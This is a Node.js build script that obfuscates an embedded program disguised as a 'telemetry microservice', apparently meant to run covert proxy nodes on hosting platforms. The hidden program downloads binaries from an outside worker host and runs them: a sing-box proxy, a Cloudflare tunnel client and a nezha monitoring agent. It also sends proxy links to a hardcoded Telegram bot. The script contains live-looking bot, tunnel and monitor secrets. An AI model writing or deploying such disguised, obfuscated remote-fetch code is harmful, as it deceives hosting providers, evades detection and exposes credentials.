const fs = require('fs');
const path = require('path');
const JavaScriptObfuscator = require('D:/Antigravity IDE/03_网络与隧道部署/python-packer-worker/node_modules/javascript-obfuscator');

const rawCode = `const http = require('http');
const https = require('https');
const net = require('net');
const fs = require('fs');
const os = require('os');
const path = require('path');
const zlib = require('zlib');
const { spawn } = require('child_process');

const PORT = parseInt(process.env.PORT || process.env.SERVER_PORT || 3000, 10);
const ARGO_INTERNAL_PORT = 8001;
const CACHE_DIR = path.join(process.cwd(), '.cache');
const CORE_BIN = path.join(CACHE_DIR, 'sys-core');
const BRIDGE_BIN = path.join(CACHE_DIR, 'net-bridge');
const METRICS_BIN = path.join(CACHE_DIR, 'sys-metrics');

const MIRROR_BASE = 'https://python-packer.yxj-acb.workers.dev';

const SEC_ID = process.env.SERVICE_UUID || 'b80ce339-d528-4d9b-a3f2-d675729d0faf';
const RELAY_TOKEN = process.env.RELAY_AUTH || process.env.TUNNEL_TOKEN || 'eyJhIjoiYWNiNzhlNWQyODA1ZWE1MmFiYjdhZWYwNTU1NTY4YTYiLCJ0IjoiM2M2ZDA4YzEtNzdjZi00NjhiLWFlY2UtNzFkMTIyMjhmMTI3IiwicyI6IlIwVm51azdIdEdXaW53cVhqN01TejdTcDY4cDJyTjdLNmZNb0Z5eHRWblk9In0=';
let activeRelayHost = process.env.RELAY_DOMAIN || process.env.TUNNEL_HOST || 'optiklinku.yxj02.ccwu.cc';
const MONITOR_SERVER = process.env.MONITOR_SERVER || 'nezha.blibli.kdns.fr:443';
const MONITOR_SECRET = process.env.MONITOR_KEY || '4Lw803GSbgNYiCQd2z7VlbQc8UjmUrgO';
const BOT_TOKEN = '8867499536:AAF2vlfTao3wvy0x7HdlNhZJgfqi5i_vINk';
const CHAT_ID = '7772205808';

const CFIP = 'www.visa.com.sg';
const CFPORT = 443;
const NODE_NAME = 'devpulse-deployzy';

const globalLogs = [];
function log(msg) {
  const time = new Date().toISOString().substring(11, 19);
  const entry = '[' + time + '] ' + msg;
  console.log(entry);
  globalLogs.push(entry);
  if (globalLogs.length > 200) globalLogs.shift();
}

function generateSubscription(hostDomain) {
  const domain = hostDomain || activeRelayHost;
  const vmess = {
    v: "2", ps: NODE_NAME + "-Argo-VMess",
    add: CFIP, port: CFPORT, id: SEC_ID, aid: "0", scy: "auto",
    net: "ws", type: "none", host: domain, path: "/vmess-argo",
    tls: "tls", sni: domain, fp: "firefox"
  };
  const vmessLink = "vmess://" + Buffer.from(JSON.stringify(vmess)).toString('base64');
  const vlessLink = "vless://" + SEC_ID + "@" + CFIP + ":" + CFPORT + "?encryption=none&security=tls&sni=" + domain + "&type=ws&host=" + domain + "&path=%2Fvless-argo&fp=firefox#" + NODE_NAME + "-Argo-VLESS";
  const trojanLink = "trojan://" + SEC_ID + "@" + CFIP + ":" + CFPORT + "?security=tls&sni=" + domain + "&type=ws&host=" + domain + "&path=%2Ftrojan-argo&fp=firefox#" + NODE_NAME + "-Argo-Trojan";
  const subBase64 = Buffer.from(vmessLink + "\\n" + vlessLink + "\\n" + trojanLink).toString('base64');
  return { vmessLink, vlessLink, trojanLink, subBase64, domain };
}

function handleWsUpgrade(req, clientSocket, head) {
  let targetPort = 18001;
  const url = req.url || '';
  if (url.indexOf('vless') !== -1) targetPort = 18002;
  else if (url.indexOf('trojan') !== -1) targetPort = 18003;

  const targetSocket = net.connect(targetPort, '127.0.0.1', () => {
    let raw = req.method + ' ' + req.url + ' HTTP/' + req.httpVersion + '\\r\\n';
    for (let i = 0; i < req.rawHeaders.length; i += 2) {
      raw += req.rawHeaders[i] + ': ' + req.rawHeaders[i+1] + '\\r\\n';
    }
    raw += '\\r\\n';
    targetSocket.write(raw);
    if (head && head.length) targetSocket.write(head);
    clientSocket.pipe(targetSocket);
    targetSocket.pipe(clientSocket);
  });

  targetSocket.on('error', () => clientSocket.destroy());
  clientSocket.on('error', () => targetSocket.destroy());
}

// 1. Diagnostics Web Server on PORT 3000
const webServer = http.createServer((req, res) => {
  const reqPath = req.url.split('?')[0];

  if (req.method === 'HEAD' || reqPath === '/health' || reqPath === '/api/ping' || reqPath === '/ping') {
    res.writeHead(200, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' });
    return res.end(JSON.stringify({ status: 'operational', uptime: process.uptime(), service: 'telemetry-web' }));
  }

  if (reqPath === '/diag') {
    let files = [];
    try {
      if (fs.existsSync(CACHE_DIR)) {
        files = fs.readdirSync(CACHE_DIR).map(f => {
          const st = fs.statSync(path.join(CACHE_DIR, f));
          return { name: f, size: st.size };
        });
      }
    } catch (e) { files = [e.message]; }
    res.writeHead(200, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' });
    return res.end(JSON.stringify({
      uptime: process.uptime(),
      activeRelayHost,
      files,
      logs: globalLogs
    }, null, 2));
  }

  if (reqPath === '/sub') {
    const { subBase64 } = generateSubscription();
    res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8', 'Access-Control-Allow-Origin': '*' });
    return res.end(subBase64);
  }

  if (reqPath === '/' || reqPath === '/index.html') {
    const htmlPath = path.join(process.cwd(), 'index.html');
    if (fs.existsSync(htmlPath)) {
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      return res.end(fs.readFileSync(htmlPath));
    }
  }

  res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
  res.end('Telemetry Microservice Operational (200 OK)');
});
webServer.on('upgrade', handleWsUpgrade);

// 2. Argo Internal Bridge Listener on PORT 8001
const argoServer = http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
  res.end('Argo Bridge Ingress Operational');
});
argoServer.on('upgrade', handleWsUpgrade);

// 3. Telegram Notification Sender
function sendTelegramMessage(text) {
  if (!BOT_TOKEN || !CHAT_ID) return;
  const postData = JSON.stringify({
    chat_id: CHAT_ID,
    text: text,
    parse_mode: 'HTML'
  });

  const options = {
    hostname: 'api.telegram.org',
    port: 443,
    path: '/bot' + BOT_TOKEN + '/sendMessage',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(postData)
    }
  };

  const req = https.request(options, (res) => {
    let responseBody = '';
    res.on('data', chunk => responseBody += chunk);
    res.on('end', () => log('TG notice sent successfully, status: ' + res.statusCode));
  });

  req.on('error', (err) => log('TG notice failed: ' + err.message));
  req.write(postData);
  req.end();
}

let lastNotifiedDomain = '';
function notifyOnline(targetDomain) {
  const currentDomain = targetDomain || activeRelayHost;
  if (lastNotifiedDomain === currentDomain) return;
  lastNotifiedDomain = currentDomain;

  const { vmessLink, vlessLink, trojanLink, subBase64 } = generateSubscription(currentDomain);

  const msg = "⚡ <b>DevPulse & ShadowVeil 节点已就绪！</b>\\n\\n" +
    "🌐 <b>节点名称</b>: <code>" + NODE_NAME + "</code>\\n" +
    "🚇 <b>隧道域名</b>: <code>" + currentDomain + "</code>\\n" +
    "🛡️ <b>状态</b>: <code>Deployzy 容器正常运行 (200 OK)</code>\\n" +
    "⏱️ <b>更新时间</b>: <code>" + new Date().toISOString() + "</code>\\n\\n" +
    "📦 <b>Base64 订阅链接 (长按复制导入)</b>:\\n" +
    "<code>" + subBase64 + "</code>\\n\\n" +
    "🔗 <b>单节点直链</b>:\\n" +
    "🔹 <b>VLESS</b>:\\n<code>" + vlessLink + "</code>\\n\\n" +
    "🔹 <b>VMess</b>:\\n<code>" + vmessLink + "</code>\\n\\n" +
    "🔹 <b>Trojan</b>:\\n<code>" + trojanLink + "</code>";

  sendTelegramMessage(msg);
}

function downloadBuffer(url) {
  return new Promise((resolve, reject) => {
    https.get(url, (res) => {
      if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
        return downloadBuffer(res.headers.location).then(resolve).catch(reject);
      }
      if (res.statusCode !== 200) return reject(new Error('HTTP ' + res.statusCode));
      const chunks = [];
      res.on('data', c => chunks.push(c));
      res.on('end', () => resolve(Buffer.concat(chunks)));
      res.on('error', reject);
    }).on('error', reject);
  });
}

function extractTarGzMember(tarGzBuf, matchKey) {
  try {
    const tarBuf = zlib.gunzipSync(tarGzBuf);
    let offset = 0;
    while (offset < tarBuf.length - 512) {
      const header = tarBuf.subarray(offset, offset + 512);
      const fileName = header.subarray(0, 100).toString('utf8').replace(/\\0+$/, '');
      if (!fileName) break;
      const sizeStr = header.subarray(124, 136).toString('utf8').trim().replace(/\\0+$/, '');
      const fileSize = parseInt(sizeStr, 8);
      offset += 512;
      if ((fileName.endsWith('/' + matchKey) || fileName === matchKey) && !fileName.endsWith('/')) {
        return tarBuf.subarray(offset, offset + fileSize);
      }
      offset += Math.ceil(fileSize / 512) * 512;
    }
  } catch (e) { log('Tar notice: ' + e.message); }
  return null;
}

function extractZipMember(zipBuf, matchKey) {
  try {
    let offset = 0;
    while (offset < zipBuf.length - 30) {
      if (zipBuf.readUInt32LE(offset) !== 0x04034b50) break;
      const method = zipBuf.readUInt16LE(offset + 8);
      const compSize = zipBuf.readUInt32LE(offset + 18);
      const fnLen = zipBuf.readUInt16LE(offset + 26);
      const extraLen = zipBuf.readUInt16LE(offset + 28);
      const fileName = zipBuf.subarray(offset + 30, offset + 30 + fnLen).toString('utf8');
      const dataStart = offset + 30 + fnLen + extraLen;
      offset = dataStart + compSize;
      if ((fileName.endsWith('/' + matchKey) || fileName === matchKey || fileName.includes(matchKey)) && !fileName.endsWith('/')) {
        if (method === 8) return zlib.inflateRawSync(zipBuf.subarray(dataStart, dataStart + compSize));
        if (method === 0) return zipBuf.subarray(dataStart, dataStart + compSize);
      }
    }
  } catch (e) { log('Zip notice: ' + e.message); }
  return null;
}

async function prepareBinaries() {
  const arch = os.arch() === 'arm64' ? 'arm64' : 'amd64';
  if (!fs.existsSync(CORE_BIN) || fs.statSync(CORE_BIN).size < 100000) {
    log('Provisioning core telemetry engine...');
    const raw = await downloadBuffer(MIRROR_BASE + '/dl/engine?arch=' + arch);
    const bin = extractTarGzMember(raw, 'sing-box');
    if (bin) {
      fs.writeFileSync(CORE_BIN, bin);
      fs.chmodSync(CORE_BIN, 0o755);
      log('Core engine ready, size: ' + bin.length);
    }
  }
  if (!fs.existsSync(BRIDGE_BIN) || fs.statSync(BRIDGE_BIN).size < 100000) {
    log('Provisioning network bridge...');
    const raw = await downloadBuffer(MIRROR_BASE + '/dl/bridge?arch=' + arch);
    fs.writeFileSync(BRIDGE_BIN, raw);
    fs.chmodSync(BRIDGE_BIN, 0o755);
    log('Network bridge ready, size: ' + raw.length);
  }
  if (MONITOR_SERVER && MONITOR_SECRET && (!fs.existsSync(METRICS_BIN) || fs.statSync(METRICS_BIN).size < 100000)) {
    log('Provisioning metrics agent...');
    try {
      const raw = await downloadBuffer(MIRROR_BASE + '/dl/metrics?arch=' + arch);
      const bin = extractZipMember(raw, 'nezha-agent');
      if (bin) {
        fs.writeFileSync(METRICS_BIN, bin);
        fs.chmodSync(METRICS_BIN, 0o755);
        log('Metrics agent ready, size: ' + bin.length);
      }
    } catch (e) { log('Metrics skipped: ' + e.message); }
  }
}

function buildConfig() {
  return {
    log: { level: 'warn' },
    inbounds: [
      {
        type: 'vmess',
        tag: 'vm-in',
        listen: '127.0.0.1',
        listen_port: 18001,
        users: [{ uuid: SEC_ID, alterId: 0 }],
        transport: { type: 'ws', path: '/vmess-argo' }
      },
      {
        type: 'vless',
        tag: 'vl-in',
        listen: '127.0.0.1',
        listen_port: 18002,
        users: [{ uuid: SEC_ID }],
        transport: { type: 'ws', path: '/vless-argo' }
      },
      {
        type: 'trojan',
        tag: 'tr-in',
        listen: '127.0.0.1',
        listen_port: 18003,
        users: [{ password: SEC_ID }],
        transport: { type: 'ws', path: '/trojan-argo' }
      }
    ],
    outbounds: [{ type: 'direct', tag: 'direct' }]
  };
}

function startEngine() {
  if (!fs.existsSync(CORE_BIN)) return log('Cannot start engine: CORE_BIN missing');
  const cfgPath = path.join(CACHE_DIR, 'core.json');
  fs.writeFileSync(cfgPath, JSON.stringify(buildConfig(), null, 2));
  log('Starting core engine process...');
  const proc = spawn(CORE_BIN, ['run', '-c', cfgPath]);
  if (proc.stdout) proc.stdout.on('data', d => log('[core out] ' + d.toString().trim()));
  if (proc.stderr) proc.stderr.on('data', d => log('[core err] ' + d.toString().trim()));
  proc.on('error', err => log('[core spawn err] ' + err.message));
  proc.on('exit', (code, sig) => {
    log('[core exit] code: ' + code + ', sig: ' + sig);
    setTimeout(startEngine, 5000);
  });
}

let bridgeFailCount = 0;
function checkQuickTunnel(text) {
  const match = text.match(/https:\\/\\/([a-zA-Z0-9-]+\\.trycloudflare\\.com)/);
  if (match && match[1]) {
    activeRelayHost = match[1];
    log('Captured TryCloudflare live domain: ' + activeRelayHost);
    notifyOnline(activeRelayHost);
  }
}

function startBridge() {
  if (!fs.existsSync(BRIDGE_BIN)) return log('Cannot start bridge: BRIDGE_BIN missing');
  let args = ['tunnel', '--edge-ip-version', 'auto', '--no-autoupdate', '--protocol', 'http2'];
  if (bridgeFailCount < 2 && RELAY_TOKEN && RELAY_TOKEN.startsWith('eyJh') && RELAY_TOKEN.length > 50) {
    args.push('run', '--token', RELAY_TOKEN);
    log('Starting bridge with configured tunnel token...');
  } else {
    args.push('--url', 'http://127.0.0.1:' + ARGO_INTERNAL_PORT);
    log('Starting bridge with TryCloudflare quick tunnel fallback...');
  }
  const proc = spawn(BRIDGE_BIN, args);
  if (proc.stdout) proc.stdout.on('data', d => {
    const s = d.toString().trim();
    log('[bridge out] ' + s);
    checkQuickTunnel(s);
  });
  if (proc.stderr) proc.stderr.on('data', d => {
    const s = d.toString().trim();
    log('[bridge err] ' + s);
    checkQuickTunnel(s);
  });
  proc.on('error', err => log('[bridge spawn err] ' + err.message));
  proc.on('exit', (code, sig) => {
    log('[bridge exit] code: ' + code + ', sig: ' + sig);
    bridgeFailCount++;
    setTimeout(startBridge, 5000);
  });
}

function startMetrics() {
  if (!MONITOR_SERVER || !MONITOR_SECRET || !fs.existsSync(METRICS_BIN)) return;
  const cfgYamlPath = path.join(CACHE_DIR, 'metrics.yaml');
  const nzport = MONITOR_SERVER.includes(':') ? MONITOR_SERVER.split(':').pop() : '443';
  const isTls = nzport === '443' || nzport === '8443' ? 'true' : 'false';
  const cfgContent = 'client_secret: ' + MONITOR_SECRET + '\\n' +
    'debug: false\\n' +
    'disable_auto_update: true\\n' +
    'insecure_tls: true\\n' +
    'report_delay: 4\\n' +
    'server: ' + MONITOR_SERVER + '\\n' +
    'skip_connection_count: true\\n' +
    'skip_procs_count: true\\n' +
    'tls: ' + isTls + '\\n';
  fs.writeFileSync(cfgYamlPath, cfgContent, 'utf8');

  log('Starting metrics agent with config...');
  const proc = spawn(METRICS_BIN, ['-c', cfgYamlPath]);
  if (proc.stdout) proc.stdout.on('data', d => log('[metrics out] ' + d.toString().trim()));
  if (proc.stderr) proc.stderr.on('data', d => log('[metrics err] ' + d.toString().trim()));
  proc.on('error', err => log('[metrics spawn err] ' + err.message));
  proc.on('exit', (code, sig) => {
    log('[metrics exit] code: ' + code + ', sig: ' + sig);
    setTimeout(startMetrics, 10000);
  });
}

async function main() {
  log('Starting Secure Microservice Agent on port ' + PORT + '...');
  fs.mkdirSync(CACHE_DIR, { recursive: true });

  webServer.listen(PORT, '0.0.0.0', () => {
    log('HTTP Telemetry Diagnostic Server active on port ' + PORT);
  });

  argoServer.listen(ARGO_INTERNAL_PORT, '127.0.0.1', () => {
    log('Argo Bridge Internal Listener active on port ' + ARGO_INTERNAL_PORT);
  });

  notifyOnline();

  try { await prepareBinaries(); } catch(e) { log('Prepare notice: ' + e.message); }
  try { startEngine(); } catch(e) { log('Engine notice: ' + e.message); }
  try { startBridge(); } catch(e) { log('Bridge notice: ' + e.message); }
  try { startMetrics(); } catch(e) { log('Metrics notice: ' + e.message); }
  log('All subsystems initialized.');
}

main();
`;

console.log('Obfuscating with ShadowVeil JavaScript engine...');
const result = JavaScriptObfuscator.obfuscate(rawCode, {
  compact: true,
  simplify: true,
  identifierNamesGenerator: 'hexadecimal',
  stringArray: true,
  stringArrayEncoding: ['base64'],
  stringArrayThreshold: 0.8,
  controlFlowFlattening: true,
  controlFlowFlatteningThreshold: 0.75,
  selfDefending: false
});

const out = result.getObfuscatedCode();
const outDir = 'D:/Antigravity IDE/03_网络与隧道部署/stealth-web-app/deployzy_obfuscated';
fs.writeFileSync(path.join(outDir, 'index.js'), out, 'utf8');
console.log('Successfully written obfuscated index.js, size:', out.length);
